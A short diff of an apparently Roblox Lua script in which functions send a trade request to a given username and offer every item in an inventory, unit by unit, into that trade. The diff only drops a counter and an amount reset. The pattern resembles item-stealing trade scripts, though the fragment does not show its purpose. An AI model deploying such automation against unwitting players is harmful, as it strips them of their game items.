@@ -247,7 +247,6 @@ local function sendTrade(username)
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
 end
 local function addItems()
-    local addedItems = 1
     for i, v in ipairs(itemsInventory) do
         for k=0, v.ItemAmount do
             print(v.ItemName, v.ItemAmount)
@@ -257,7 +256,6 @@ local function addItems()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
         end
-        v.ItemAmount = 0
     end
 end
 
